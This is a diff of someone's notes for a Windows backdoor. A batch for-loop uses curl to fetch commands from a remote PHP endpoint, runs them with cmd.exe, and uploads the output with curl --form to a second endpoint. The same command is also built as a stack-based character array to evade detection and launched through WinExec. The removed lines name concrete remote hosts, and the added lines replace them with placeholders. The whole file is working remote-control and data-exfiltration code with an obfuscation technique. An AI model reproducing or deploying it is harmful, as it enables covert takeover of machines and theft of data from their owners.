@@ -1,18 +1,14 @@
 running cmd in a new instance
-for /f "delims=" %i in ('curl http://r.significantbyte.com/neweecho.php') do set output=%i && cmd.exe /c %i > temp.txt
+for /f "delims=" %i in ('curl url_to_get_commands') do set output=%i && cmd.exe /c %i > temp.txt
 
 running cmd in same instance
-for /f "delims=" %i in ('curl http://r.significantbyte.com/neweecho.php') do set output=%i && %i > temp.txt
-curl --form "fileToUpload=@temp.txt" https://r.baalejibreel.com/shaddy/getfile.php
-COMBINED: for /f "delims=" %i in ('curl https://r.baalejibreel.com/shaddy/data.php') do set output=%i && %i > temp.txt && curl --form "fileToUpload=@temp.txt" https://r.baalejibreel.com/shaddy/getfile.php
+for /f "delims=" %i in ('curl url_to_get_commands') do set output=%i && %i > temp.txt
+curl --form "fileToUpload=@temp.txt" url_to_upload_output_of_commands
+COMBINED: for /f "delims=" %i in ('curl url_to_get_commands') do set output=%i && %i > temp.txt && curl --form "fileToUpload=@temp.txt" url_to_upload_output_of_commands
 
 stack-based strings
-'c','m','d','.','e','x','e',' ','/','c',' ','"','f','o','r',' ','/','f',' ','"','d','e','l','i','m','s','=','\"',' ','%','i',' ','i','n',' ','(','\'','c','u','r','l',' ','h','t','t','p',':','/','/','r','.','s','i','g','n','i','f','i','c','a','n','t','b','y','t','e','.','c','o','m','/','n','e','w','e','e','c','h','o','.','p','h','p','\'',')',' ','d','o',' ','s','e','t',' ','o','u','t','p','u','t','=','%','i',' ','&','&',' ','%','i',' ','>',' ','t','e','m','p','.','t','x','t','"',' ','"'
-'c','m','d','.','e','x','e',' ','/','c',' ','"','f','o','r',' ','/','f',' ','"','d','e','l','i','m','s','=','"',' ','%','i',' ','i','n',' ','(','\'','c','u','r','l',' ','h','t','t','p',':','/','/','r','.','s','i','g','n','i','f','i','c','a','n','t','b','y','t','e','.','c','o','m','/','n','e','w','e','e','c','h','o','.','p','h','p','\'',')',' ','d','o',' ','s','e','t',' ','o','u','t','p','u','t','=','%','i',' ','&','&',' ','%','i','"'
-
-COMBINED:
-char cmd[] = { 'c','m','d','.','e','x','e',' ','/','c',' ','"','f','o','r',' ','/','f',' ','"','d','e','l','i','m','s','=','"',' ','%','i',' ','i','n',' ','(','\'','c','u','r','l',' ','h','t','t','p','s',':','/','/','r','.','b','a','a','l','e','j','i','b','r','e','e','l','.','c','o','m','/','s','h','a','d','d','y','/','d','a','t','a','.','p','h','p','\'',')',' ','d','o',' ','s','e','t',' ','o','u','t','p','u','t','=','%','i',' ','&','&',' ','%','i',' ','>',' ','C',':','\\','u','s','e','r','s','\\','p','u','b','l','i','c','\\','t','e','m','p','.','t','x','t',' ','&','&',' ','c','u','r','l',' ','-','-','f','o','r','m',' ','"','f','i','l','e','T','o','U','p','l','o','a','d','=','@','C',':','\\','u','s','e','r','s','\\','p','u','b','l','i','c','\\','t','e','m','p','.','t','x','t','"',' ','h','t','t','p','s',':','/','/','r','.','b','a','a','l','e','j','i','b','r','e','e','l','.','c','o','m','/','s','h','a','d','d','y','/','g','e','t','f','i','l','e','.','p','h','p','"',' ','"', 0};
+just initialize the string as char array with a each character as array element
 
 winexec cmd
-WinExec cmd variable: LPCSTR cmd = "cmd.exe /c \"for /f \"delims=\" %i in ('curl https://r.baalejibreel.com/shaddy/data.php') do set output=%i && %i > C:\\users\\public\\temp.txt && curl --form \"fileToUpload=@C:\\users\\public\\temp.txt\" https://r.baalejibreel.com/shaddy/getfile.php\" ";
-WinExec("cmd.exe /c \"for /f \"delims=\" %i in ('curl http://r.significantbyte.com/neweecho.php') do set output=%i && %i > temp.txt\" ", 0);
+WinExec cmd variable: LPCSTR cmd = "cmd.exe /c \"for /f \"delims=\" %i in ('curl url_to_get_commands') do set output=%i && %i > C:\\users\\public\\temp.txt && curl --form \"fileToUpload=@C:\\users\\public\\temp.txt\" url_to_upload_output_of_commands\" ";
+WinExec("cmd.exe /c \"for /f \"delims=\" %i in ('curl url_to_get_commands') do set output=%i && %i > temp.txt\" ", 0);
